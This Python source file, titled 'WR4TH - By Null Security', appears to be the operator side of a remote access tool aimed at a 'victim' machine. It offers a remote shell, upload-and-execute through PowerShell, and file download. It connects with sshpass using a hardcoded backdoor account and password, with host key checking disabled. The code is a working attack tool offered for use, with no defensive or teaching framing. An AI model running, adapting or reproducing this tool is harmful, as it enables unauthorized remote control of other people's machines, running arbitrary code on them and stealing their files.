import os
import ctypes
import sys
import getpass
import subprocess
import colorama
import time
from colorama import Fore, Back, Style
from modules import *

# Constants and configuration
terminal_title = "WR4TH - By Null Security"
print(f'\33]0;{terminal_title}\a', end='', flush=True)

# Banner display
def fire_color(level):
    """Return a color code based on the level from 0 (dark red) to 7 (bright yellow)."""
    colors = [
        "\033[38;2;255;0;0m",    # Intense red
        "\033[38;2;255;69;0m",   # Red-orange
        "\033[38;2;255;99;71m",  # Light coral
        "\033[38;2;255;140;0m", # Dark orange
        "\033[38;2;255;165;0m", # Orange
        "\033[38;2;255;204;0m", # Yellow-orange
        "\033[38;2;255;255;0m", # Bright yellow
        "\033[38;2;255;255;128m" # Very soft yellow (Light Goldenrod)
    ]
    return colors[level % len(colors)]

banner = f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{fire_color(0)}⣀⣀⣀⣀⣀⣀{Style.RESET_ALL}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠞{fire_color(1)}⢛⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀{Style.RESET_ALL}⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀{fire_color(2)}⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄{Style.RESET_ALL}⠀⠀⠀⠀⠀        {fire_color(5)}:::       ::: :::::::::      :::   ::::::::::: :::    ::: {Style.RESET_ALL}
⠀⠀⠀⢀⡾⠋⠀⠀⠀{fire_color(3)}⢰⣿⣿⡿⠉⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣷⡀{Style.RESET_ALL}⠀⠀⠀        {fire_color(6)}:+:       :+: :+:    :+:    :+:+:      :+:     :+:    :+: {Style.RESET_ALL}
⠀⠀⢠⡞⠀⠀⠀⠀⠀{fire_color(4)}⢸⣿⣿⣇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄{Style.RESET_ALL}⠀⠀       {fire_color(7)} +:+       +:+ +:+    +:+   +:+ +:+     +:+     +:+    +:+ {Style.RESET_ALL}
⠀⠀⣾⠁⠀⠀⠀⠀⠀{fire_color(5)}⠘⣿⣿⣿⣷⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷{Style.RESET_ALL}⠀⠀        {fire_color(6)}+#+  +:+  +#+ +#++:++#:   +#+   +#+    +#+     +#++:++#++ {Style.RESET_ALL}
⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀{fire_color(6)}⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{Style.RESET_ALL}⠀        {fire_color(7)}+#+ +#+#+ +#+ +#+    +#+  +#+#+#+#+    +#+     +#+    +#+ {Style.RESET_ALL}
⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀{fire_color(7)}⠉⠙⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇{Style.RESET_ALL}⠀         {fire_color(5)}#+#+# #+#+#  #+#    #+#  #+#   #+#    #+#     #+#    #+# {Style.RESET_ALL}
⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{fire_color(6)}⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⡇{Style.RESET_ALL}⠀          {fire_color(5)}###   ###   ###    ###  ###   ###    ###     ###    ###{Style.RESET_ALL}
⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⡀⠀⠀⠀{fire_color(4)}⢻⣿⣿⣿⣿⣿⣿⡿{Style.RESET_ALL}⠀⠀
⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡆⠀⠀{fire_color(3)}⢸⣿⣿⣿⣿⣿⡿⠃{Style.RESET_ALL}⠀⠀
⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⠿⠁⠀⠀{fire_color(2)}⣸⣿⣿⣿⣿⡿⠁{Style.RESET_ALL}⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{fire_color(1)}⣰⣿⣿⣿⡿⠋{Style.RESET_ALL}⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⢦⣤⣄⣀{fire_color(0)}⣀⣀⣠⣤⣾⡿⠿⠋⠁{Style.RESET_ALL}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

option_menu = """

                                    [+] Functions:

                                          [0] Exit
                                          [1] Remote Shell
                                          [2] Upload and Execute File
                                          [3] Retrieve Base file
 """
def leave():
    time.sleep(1)
    print(f"{Fore.GREEN}> Exiting.. See you next time !")
    time.sleep(1)
    os.system('clear')
    sys.exit(0)

#connect to victim
def connect(address, password):
    os.system(f"sshpass -p \"{password}\" ssh -o StrictHostKeyChecking=no {uname}@{address}")

#remote download
def remote_download(address, password, dfile, path):
    os.system(f"sshpass -p \"{password}\" scp -r {uname}@{address}:{path} {lpath}")

# User information and module path
module = "modules"
current_directory = os.getcwd()
modules_path = os.path.join(current_directory, module)
header = f"{Fore.RED}|WR4TH||Null Security| >{Fore.RESET}"

# Function to read configuration from a file
#read config file
def read_config(config_file):
    configuration = {}

    #read file contents
    read_lines = open(config_file, "r").readlines()

    #get data
    configuration = {"IPADDRESS": read_lines[0].strip()}
    configuration["DIRECTORY"] = (read_lines[1]).replace("\\", "/").strip()
    return configuration
    
# Get the config file name from the command-line argument
config_file = sys.argv[1]

# Initialize the configuration using the read_config function
configuration = read_config(config_file)

#configuration
ipv4 = configuration.get("IPADDRESS")
wdir = configuration.get("DIRECTORY")
uname = "SystemAdmin"
pword = "Sys1emP@ss"
dl = "downloads"
lpath = modules_path = os.path.join(current_directory, dl)
        
# Define the CLI function to display the banner and handle arguments
def cli(arguments):
    os.system('clear')
    print(banner)
    if arguments:
        print(option_menu)
        option = input(f"{header}")
        if option == "0":                                   #exit
            leave()
        elif option == "1":                                 #remote shell
            connect(ipv4,pword)
        elif option == "2":                                 #upload
            logger = input(f"File Name: ")
            remote_upload(ipv4, pword, logger, wdir)
            os.system(f"sshpass -p \"{pword}\" ssh -o StrictHostKeyChecking=no {uname}@{ipv4} \"powershell.exe; cd '{wdir}'; .\{logger}\";")
            print(f"{Fore.MAGENTA}File Executed!")        
        elif option == "3":                                 #download base file
            remote_download(ipv4, pword, lpath, wdir)
            print(f"{Fore.MAGENTA}File Downloaded!")
    else:
        print("Configuration file not provided.")

def main():
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    cli(arguments_exist)

if __name__ == "__main__":
    main()
